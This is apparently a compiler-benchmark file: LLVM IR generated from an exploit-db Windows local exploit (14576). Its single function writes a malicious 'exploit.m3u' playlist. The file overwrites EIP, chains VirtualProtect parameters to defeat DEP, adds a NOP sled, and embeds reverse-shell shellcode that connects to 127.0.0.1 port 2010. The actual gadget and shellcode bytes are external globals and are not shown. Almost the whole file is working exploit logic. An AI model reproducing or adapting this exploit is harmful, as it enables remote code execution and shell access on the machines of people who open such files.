; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_14576.c_file.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_14576.c_file.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [12 x i8] c"exploit.m3u\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"2010\00", align 1
@eip_offset = common dso_local global i32 0, align 4
@RET = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [5 x i8] c"aaaa\00", align 1
@instr1 = common dso_local global i8* null, align 8
@instr2 = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [5 x i8] c"bbbb\00", align 1
@instr3 = common dso_local global i8* null, align 8
@virtualprotect = common dso_local global i8* null, align 8
@retaddr = common dso_local global i8* null, align 8
@lpaddr = common dso_local global i8* null, align 8
@sz = common dso_local global i8* null, align 8
@flnprot = common dso_local global i8* null, align 8
@instr5 = common dso_local global i8* null, align 8
@instr4 = common dso_local global i8* null, align 8
@instr6 = common dso_local global i8* null, align 8
@instr7 = common dso_local global i8* null, align 8
@instr8 = common dso_local global i8* null, align 8
@instr9 = common dso_local global i8* null, align 8
@instr10 = common dso_local global i8* null, align 8
@instr11 = common dso_local global i8* null, align 8
@instr12 = common dso_local global i8* null, align 8
@reverse_sc = common dso_local global i8* null, align 8
@HEAD = common dso_local global i8* null, align 8
@URL = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @file() #0 {
  %1 = alloca i32*, align 8
  %2 = alloca [100001 x i8], align 16
  %3 = call i32* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  store i32* %3, i32** %1, align 8
  %4 = load i32*, i32** %1, align 8
  %5 = icmp ne i32* %4, null
  br i1 %5, label %8, label %6

6:                                                ; preds = %0
  %7 = call i32 (...) @error_handle()
  br label %8

8:                                                ; preds = %6, %0
  %9 = call i32 @make_reverseshell(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %10 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %11 = call i32 @gen_random(i8* %10, i32 26117)
  %12 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %13 = load i32, i32* @eip_offset, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %12, i64 %14
  %16 = load i8*, i8** @RET, align 8
  %17 = call i32 (i8*, ...) @memcpy(i8* %15, i8* %16, i32 4)
  %18 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %19 = load i32, i32* @eip_offset, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  %22 = getelementptr inbounds i8, i8* %21, i64 4
  %23 = call i32 (i8*, ...) @memcpy(i8* %22, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i32 4)
  %24 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %25 = load i32, i32* @eip_offset, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = getelementptr inbounds i8, i8* %27, i64 8
  %29 = load i8*, i8** @instr1, align 8
  %30 = call i32 (i8*, ...) @memcpy(i8* %28, i8* %29, i32 4)
  %31 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %32 = load i32, i32* @eip_offset, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = getelementptr inbounds i8, i8* %34, i64 12
  %36 = load i8*, i8** @instr2, align 8
  %37 = call i32 (i8*, ...) @memcpy(i8* %35, i8* %36, i32 4)
  %38 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %39 = load i32, i32* @eip_offset, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = getelementptr inbounds i8, i8* %41, i64 16
  %43 = call i32 (i8*, ...) @memcpy(i8* %42, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i32 4)
  %44 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %45 = load i32, i32* @eip_offset, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = getelementptr inbounds i8, i8* %47, i64 20
  %49 = load i8*, i8** @instr3, align 8
  %50 = call i32 (i8*, ...) @memcpy(i8* %48, i8* %49, i32 4)
  %51 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %52 = load i32, i32* @eip_offset, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = getelementptr inbounds i8, i8* %54, i64 24
  %56 = load i8*, i8** @virtualprotect, align 8
  %57 = call i32 (i8*, ...) @memcpy(i8* %55, i8* %56, i32 4)
  %58 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %59 = load i32, i32* @eip_offset, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  %62 = getelementptr inbounds i8, i8* %61, i64 28
  %63 = load i8*, i8** @retaddr, align 8
  %64 = call i32 (i8*, ...) @memcpy(i8* %62, i8* %63, i32 4)
  %65 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %66 = load i32, i32* @eip_offset, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = getelementptr inbounds i8, i8* %68, i64 32
  %70 = load i8*, i8** @lpaddr, align 8
  %71 = call i32 (i8*, ...) @memcpy(i8* %69, i8* %70, i32 4)
  %72 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %73 = load i32, i32* @eip_offset, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8, i8* %72, i64 %74
  %76 = getelementptr inbounds i8, i8* %75, i64 36
  %77 = load i8*, i8** @sz, align 8
  %78 = call i32 (i8*, ...) @memcpy(i8* %76, i8* %77, i32 4)
  %79 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %80 = load i32, i32* @eip_offset, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8, i8* %79, i64 %81
  %83 = getelementptr inbounds i8, i8* %82, i64 40
  %84 = load i8*, i8** @flnprot, align 8
  %85 = call i32 (i8*, ...) @memcpy(i8* %83, i8* %84, i32 4)
  %86 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %87 = load i32, i32* @eip_offset, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = getelementptr inbounds i8, i8* %89, i64 44
  %91 = call i32 @memset(i8* %90, i32 144, i32 300)
  %92 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %93 = load i32, i32* @eip_offset, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = getelementptr inbounds i8, i8* %95, i64 68
  %97 = load i8*, i8** @instr5, align 8
  %98 = call i32 (i8*, ...) @memcpy(i8* %96, i8* %97, i32 4)
  %99 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %100 = load i32, i32* @eip_offset, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  %103 = getelementptr inbounds i8, i8* %102, i64 72
  %104 = load i8*, i8** @instr4, align 8
  %105 = call i32 (i8*, ...) @memcpy(i8* %103, i8* %104, i32 4)
  %106 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %107 = load i32, i32* @eip_offset, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %106, i64 %108
  %110 = getelementptr inbounds i8, i8* %109, i64 84
  %111 = load i8*, i8** @instr6, align 8
  %112 = call i32 (i8*, ...) @memcpy(i8* %110, i8* %111, i32 4)
  %113 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %114 = load i32, i32* @eip_offset, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %113, i64 %115
  %117 = getelementptr inbounds i8, i8* %116, i64 92
  %118 = load i8*, i8** @instr7, align 8
  %119 = call i32 (i8*, ...) @memcpy(i8* %117, i8* %118, i32 4)
  %120 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %121 = load i32, i32* @eip_offset, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = getelementptr inbounds i8, i8* %123, i64 96
  %125 = load i8*, i8** @instr4, align 8
  %126 = call i32 (i8*, ...) @memcpy(i8* %124, i8* %125, i32 4)
  %127 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %128 = load i32, i32* @eip_offset, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8, i8* %127, i64 %129
  %131 = getelementptr inbounds i8, i8* %130, i64 104
  %132 = load i8*, i8** @instr8, align 8
  %133 = call i32 (i8*, ...) @memcpy(i8* %131, i8* %132, i32 4)
  %134 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %135 = load i32, i32* @eip_offset, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %134, i64 %136
  %138 = getelementptr inbounds i8, i8* %137, i64 108
  %139 = load i8*, i8** @instr8, align 8
  %140 = call i32 (i8*, ...) @memcpy(i8* %138, i8* %139, i32 4)
  %141 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %142 = load i32, i32* @eip_offset, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds i8, i8* %141, i64 %143
  %145 = getelementptr inbounds i8, i8* %144, i64 112
  %146 = load i8*, i8** @instr8, align 8
  %147 = call i32 (i8*, ...) @memcpy(i8* %145, i8* %146, i32 4)
  %148 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %149 = load i32, i32* @eip_offset, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds i8, i8* %148, i64 %150
  %152 = getelementptr inbounds i8, i8* %151, i64 116
  %153 = load i8*, i8** @instr8, align 8
  %154 = call i32 (i8*, ...) @memcpy(i8* %152, i8* %153, i32 4)
  %155 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %156 = load i32, i32* @eip_offset, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i8, i8* %155, i64 %157
  %159 = getelementptr inbounds i8, i8* %158, i64 120
  %160 = load i8*, i8** @instr6, align 8
  %161 = call i32 (i8*, ...) @memcpy(i8* %159, i8* %160, i32 4)
  %162 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %163 = load i32, i32* @eip_offset, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds i8, i8* %162, i64 %164
  %166 = getelementptr inbounds i8, i8* %165, i64 128
  %167 = load i8*, i8** @instr7, align 8
  %168 = call i32 (i8*, ...) @memcpy(i8* %166, i8* %167, i32 4)
  %169 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %170 = load i32, i32* @eip_offset, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds i8, i8* %169, i64 %171
  %173 = getelementptr inbounds i8, i8* %172, i64 132
  %174 = load i8*, i8** @instr9, align 8
  %175 = call i32 (i8*, ...) @memcpy(i8* %173, i8* %174, i32 4)
  %176 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %177 = load i32, i32* @eip_offset, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds i8, i8* %176, i64 %178
  %180 = getelementptr inbounds i8, i8* %179, i64 136
  %181 = load i8*, i8** @instr4, align 8
  %182 = call i32 (i8*, ...) @memcpy(i8* %180, i8* %181, i32 4)
  %183 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %184 = load i32, i32* @eip_offset, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds i8, i8* %183, i64 %185
  %187 = getelementptr inbounds i8, i8* %186, i64 144
  %188 = load i8*, i8** @instr4, align 8
  %189 = call i32 (i8*, ...) @memcpy(i8* %187, i8* %188, i32 4)
  %190 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %191 = load i32, i32* @eip_offset, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds i8, i8* %190, i64 %192
  %194 = getelementptr inbounds i8, i8* %193, i64 152
  %195 = load i8*, i8** @instr4, align 8
  %196 = call i32 (i8*, ...) @memcpy(i8* %194, i8* %195, i32 4)
  %197 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %198 = load i32, i32* @eip_offset, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds i8, i8* %197, i64 %199
  %201 = getelementptr inbounds i8, i8* %200, i64 160
  %202 = load i8*, i8** @instr8, align 8
  %203 = call i32 (i8*, ...) @memcpy(i8* %201, i8* %202, i32 4)
  %204 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %205 = load i32, i32* @eip_offset, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds i8, i8* %204, i64 %206
  %208 = getelementptr inbounds i8, i8* %207, i64 164
  %209 = load i8*, i8** @instr8, align 8
  %210 = call i32 (i8*, ...) @memcpy(i8* %208, i8* %209, i32 4)
  %211 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %212 = load i32, i32* @eip_offset, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds i8, i8* %211, i64 %213
  %215 = getelementptr inbounds i8, i8* %214, i64 168
  %216 = load i8*, i8** @instr8, align 8
  %217 = call i32 (i8*, ...) @memcpy(i8* %215, i8* %216, i32 4)
  %218 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %219 = load i32, i32* @eip_offset, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds i8, i8* %218, i64 %220
  %222 = getelementptr inbounds i8, i8* %221, i64 172
  %223 = load i8*, i8** @instr8, align 8
  %224 = call i32 (i8*, ...) @memcpy(i8* %222, i8* %223, i32 4)
  %225 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %226 = load i32, i32* @eip_offset, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds i8, i8* %225, i64 %227
  %229 = getelementptr inbounds i8, i8* %228, i64 176
  %230 = load i8*, i8** @instr6, align 8
  %231 = call i32 (i8*, ...) @memcpy(i8* %229, i8* %230, i32 4)
  %232 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %233 = load i32, i32* @eip_offset, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i8, i8* %232, i64 %234
  %236 = getelementptr inbounds i8, i8* %235, i64 184
  %237 = load i8*, i8** @instr7, align 8
  %238 = call i32 (i8*, ...) @memcpy(i8* %236, i8* %237, i32 4)
  %239 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %240 = load i32, i32* @eip_offset, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds i8, i8* %239, i64 %241
  %243 = getelementptr inbounds i8, i8* %242, i64 188
  %244 = load i8*, i8** @instr9, align 8
  %245 = call i32 (i8*, ...) @memcpy(i8* %243, i8* %244, i32 4)
  %246 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %247 = load i32, i32* @eip_offset, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds i8, i8* %246, i64 %248
  %250 = getelementptr inbounds i8, i8* %249, i64 192
  %251 = load i8*, i8** @instr10, align 8
  %252 = call i32 (i8*, ...) @memcpy(i8* %250, i8* %251, i32 4)
  %253 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %254 = load i32, i32* @eip_offset, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds i8, i8* %253, i64 %255
  %257 = getelementptr inbounds i8, i8* %256, i64 196
  %258 = load i8*, i8** @instr8, align 8
  %259 = call i32 (i8*, ...) @memcpy(i8* %257, i8* %258, i32 4)
  %260 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %261 = load i32, i32* @eip_offset, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds i8, i8* %260, i64 %262
  %264 = getelementptr inbounds i8, i8* %263, i64 200
  %265 = load i8*, i8** @instr8, align 8
  %266 = call i32 (i8*, ...) @memcpy(i8* %264, i8* %265, i32 4)
  %267 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %268 = load i32, i32* @eip_offset, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds i8, i8* %267, i64 %269
  %271 = getelementptr inbounds i8, i8* %270, i64 204
  %272 = load i8*, i8** @instr8, align 8
  %273 = call i32 (i8*, ...) @memcpy(i8* %271, i8* %272, i32 4)
  %274 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %275 = load i32, i32* @eip_offset, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds i8, i8* %274, i64 %276
  %278 = getelementptr inbounds i8, i8* %277, i64 208
  %279 = load i8*, i8** @instr8, align 8
  %280 = call i32 (i8*, ...) @memcpy(i8* %278, i8* %279, i32 4)
  %281 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %282 = load i32, i32* @eip_offset, align 4
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds i8, i8* %281, i64 %283
  %285 = getelementptr inbounds i8, i8* %284, i64 212
  %286 = load i8*, i8** @instr6, align 8
  %287 = call i32 (i8*, ...) @memcpy(i8* %285, i8* %286, i32 4)
  %288 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %289 = load i32, i32* @eip_offset, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds i8, i8* %288, i64 %290
  %292 = getelementptr inbounds i8, i8* %291, i64 220
  %293 = load i8*, i8** @instr11, align 8
  %294 = call i32 (i8*, ...) @memcpy(i8* %292, i8* %293, i32 4)
  %295 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %296 = load i32, i32* @eip_offset, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds i8, i8* %295, i64 %297
  %299 = getelementptr inbounds i8, i8* %298, i64 224
  %300 = load i8*, i8** @instr11, align 8
  %301 = call i32 (i8*, ...) @memcpy(i8* %299, i8* %300, i32 4)
  %302 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %303 = load i32, i32* @eip_offset, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds i8, i8* %302, i64 %304
  %306 = getelementptr inbounds i8, i8* %305, i64 228
  %307 = load i8*, i8** @instr12, align 8
  %308 = call i32 (i8*, ...) @memcpy(i8* %306, i8* %307, i32 4)
  %309 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %310 = load i32, i32* @eip_offset, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds i8, i8* %309, i64 %311
  %313 = getelementptr inbounds i8, i8* %312, i64 344
  %314 = load i8*, i8** @reverse_sc, align 8
  %315 = load i8*, i8** @reverse_sc, align 8
  %316 = call i32 @strlen(i8* %315)
  %317 = call i32 (i8*, ...) @memcpy(i8* %313, i8* %314, i32 %316)
  %318 = load i8*, i8** @HEAD, align 8
  %319 = load i8*, i8** @HEAD, align 8
  %320 = call i32 @strlen(i8* %319)
  %321 = load i32*, i32** %1, align 8
  %322 = call i32 @fwrite(i8* %318, i32 1, i32 %320, i32* %321)
  %323 = load i8*, i8** @URL, align 8
  %324 = load i8*, i8** @URL, align 8
  %325 = call i32 @strlen(i8* %324)
  %326 = load i32*, i32** %1, align 8
  %327 = call i32 @fwrite(i8* %323, i32 1, i32 %325, i32* %326)
  %328 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %329 = getelementptr inbounds [100001 x i8], [100001 x i8]* %2, i64 0, i64 0
  %330 = call i32 @strlen(i8* %329)
  %331 = load i32*, i32** %1, align 8
  %332 = call i32 @fwrite(i8* %328, i32 1, i32 %330, i32* %331)
  %333 = load i32*, i32** %1, align 8
  %334 = call i32 @fclose(i32* %333)
  ret void
}

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @error_handle(...) #1

declare dso_local i32 @make_reverseshell(i8*, i8*) #1

declare dso_local i32 @gen_random(i8*, i32) #1

declare dso_local i32 @memcpy(i8*, ...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
